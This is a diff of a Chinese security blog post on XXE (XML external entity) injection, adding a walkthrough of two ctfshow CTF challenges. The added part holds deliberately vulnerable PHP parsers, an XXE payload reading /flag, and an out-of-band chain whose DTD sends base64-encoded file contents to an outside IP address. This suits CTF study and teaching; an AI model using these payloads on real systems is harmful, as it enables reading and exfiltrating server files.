@@ -16,18 +16,22 @@
   <meta name="author" content="orange">
   <meta name="keywords" content="">
   
-    <meta name="description" content="前言:深入浅出的学习一下xxe漏洞 参考文章： 一篇文章带你深入理解漏洞之 XXE 漏洞 XXE漏洞详解(全网最详细) 一、XXE 是什么在了解xxe之前，需要了解一下xml注入，通常都是逻辑漏洞，如下内容  能插入xml代码，肯定还想要更多骚操作，于是就出现了xxe XXE(XML External Entity Injection) 全称为 XML 外部实体注入，是一个注入漏洞。注意的是外部实">
+    <meta name="description" content="前言:深入浅出的学习一下xxe漏洞 参考文章： 一篇文章带你深入理解漏洞之 XXE 漏洞 XXE漏洞详解(全网最详细) 【CTF-Web】XXE学习笔记 一、XXE 是什么在了解xxe之前，需要了解一下xml注入，通常都是逻辑漏洞，如下内容  能插入xml代码，肯定还想要更多骚操作，于是就出现了xxe XXE(XML External Entity Injection) 全称为 XML 外部实体注">
 <meta property="og:type" content="article">
 <meta property="og:title" content="xxe漏洞学习">
 <meta property="og:url" content="http://example.com/2024/06/10/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
 <meta property="og:site_name" content="0raN9e的笔记">
-<meta property="og:description" content="前言:深入浅出的学习一下xxe漏洞 参考文章： 一篇文章带你深入理解漏洞之 XXE 漏洞 XXE漏洞详解(全网最详细) 一、XXE 是什么在了解xxe之前，需要了解一下xml注入，通常都是逻辑漏洞，如下内容  能插入xml代码，肯定还想要更多骚操作，于是就出现了xxe XXE(XML External Entity Injection) 全称为 XML 外部实体注入，是一个注入漏洞。注意的是外部实">
+<meta property="og:description" content="前言:深入浅出的学习一下xxe漏洞 参考文章： 一篇文章带你深入理解漏洞之 XXE 漏洞 XXE漏洞详解(全网最详细) 【CTF-Web】XXE学习笔记 一、XXE 是什么在了解xxe之前，需要了解一下xml注入，通常都是逻辑漏洞，如下内容  能插入xml代码，肯定还想要更多骚操作，于是就出现了xxe XXE(XML External Entity Injection) 全称为 XML 外部实体注">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/xml.png">
 <meta property="og:image" content="http://example.com/images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/%E6%9C%AC%E5%9C%B0%E5%9B%9E%E6%98%BE.png">
 <meta property="og:image" content="http://example.com/images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/1.txt.png">
+<meta property="og:image" content="http://example.com/images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/web373.png">
+<meta property="og:image" content="http://example.com/images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/374-1.png">
+<meta property="og:image" content="http://example.com/images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/374-2.png">
+<meta property="og:image" content="http://example.com/images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/374-3.png">
 <meta property="article:published_time" content="2024-06-10T04:00:00.000Z">
-<meta property="article:modified_time" content="2024-06-11T10:13:49.934Z">
+<meta property="article:modified_time" content="2024-06-13T12:16:24.098Z">
 <meta property="article:author" content="orange">
 <meta property="article:tag" content="xxe">
 <meta name="twitter:card" content="summary_large_image">
@@ -255,7 +259,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.9k 字
+          2.3k 字
         
       </span>
     
@@ -266,7 +270,7 @@
         
         
         
-          16 分钟
+          20 分钟
         
       </span>
     
@@ -316,7 +320,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2024年6月11日 晚上
+                    本文最后更新于 2024年6月13日 晚上
                   
                 
               </p>
@@ -328,6 +332,7 @@
 <p>参考文章：</p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357?time__1311=n4+xnD0DgGYQwqYq40HpDUoL7rAT2rD&alichlgref=https://www.google.com/">一篇文章带你深入理解漏洞之 XXE 漏洞</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_61553520/article/details/130565993">XXE漏洞详解(全网最详细)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/jayq1/article/details/139299924">【CTF-Web】XXE学习笔记</a></p>
 <h2 id="一、XXE-是什么"><a href="#一、XXE-是什么" class="headerlink" title="一、XXE 是什么"></a><strong>一、XXE 是什么</strong></h2><p>在了解xxe之前，需要了解一下xml注入，通常都是逻辑漏洞，如下内容</p>
 <p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/xml.png" srcset="/img/loading.gif" lazyload alt="xml"></p>
 <p>能插入xml代码，肯定还想要更多骚操作，于是就出现了xxe</p>
@@ -398,6 +403,29 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE root [<br>&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=c:/test/1.txt&quot;&gt;<br>&lt;!ENTITY % dtd SYSTEM &quot;http://localhost:88/evil.xml&quot;&gt;<br>%dtd;<br>%send;<br>]&gt;<br>&lt;root&gt;&lt;/root&gt;<br> <br>evil.xml文件内容为：<br>&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://localhost:88/?content=%file;&#x27;&gt;&quot;&gt; %payload;<br></code></pre></td></tr></table></figure>
 
 <h4 id="加载本地DTD"><a href="#加载本地DTD" class="headerlink" title="加载本地DTD"></a>加载本地DTD</h4><p>这种在刷题的时候不太常见，可以参考上面的参考文章使用。</p>
+<h2 id="四、靶机演练"><a href="#四、靶机演练" class="headerlink" title="四、靶机演练"></a>四、靶机演练</h2><h3 id="1-ctfshow-web373"><a href="#1-ctfshow-web373" class="headerlink" title="1.ctfshow web373"></a>1.ctfshow web373</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>    <span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$creds</span>-&gt;ctfshow;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$ctfshow</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);    <br><br></code></pre></td></tr></table></figure>
+
+<p>代码大题的意思是读取xml，然后在xml文件中提取ctfshow标签中的内容，随后进行echo</p>
+<p>直接尝试构造就行，有回显的还是挺简单的。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ctfshow</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ctfshow</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/web373.png" srcset="/img/loading.gif" lazyload alt="web373"></p>
+<h3 id="2-ctfshow-web374"><a href="#2-ctfshow-web374" class="headerlink" title="2.ctfshow web374"></a>2.ctfshow web374</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);    <br><br></code></pre></td></tr></table></figure>
+
+<p>和第一个比较起来，第二个无回显。这个时候需要vps将内容带出来。</p>
+<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hacker</span>[</span></span><br><span class="hljs-meta"><span class="language-xml">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span> </span></span><br><span class="hljs-meta"><span class="language-xml">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtds</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps:8888/test.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">    %dtds;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span>    </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml">1</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure>
+
+<p>然后在服务器上传test.dtd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; showflag SYSTEM &#x27;http://8.130.42.113:5566/%file;&#x27;&gt;&quot;&gt;<br>&lt;!--test.dtd的内容，内部的%号要进行实体编码成&amp;#x25;  相当于% showflag--&gt;<br>%dtd;<br>%showflag;<br><br></code></pre></td></tr></table></figure>
+
+<p>先用python开端口监听</p>
+<p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/374-1.png" srcset="/img/loading.gif" lazyload alt="374-1"></p>
+<p>然后再开端口接收内容</p>
+<p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/374-2.png" srcset="/img/loading.gif" lazyload alt="374-2"></p>
+<p>最后base解密就可以了</p>
+<p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/374-3.png" srcset="/img/loading.gif" lazyload alt="374-3"></p>
+<p>流程:首先在burpsuite的repeated页面构造最上面的payload，利用参数实体，调用%dtds,获得服务器上的test.dtd,再到dtd中的%dtd中的%showflag,这里注意%需要进行实体编码&amp;#x25，把内容带出到我们开的端口上面，最后得到flag。</p>
+<p>ps:我本地没有配置web服务，所以需要开个http服务，如果有配置的话不需要一些步骤，可以参考其他师傅的wp了解一下。</p>
 
                 
               </div>
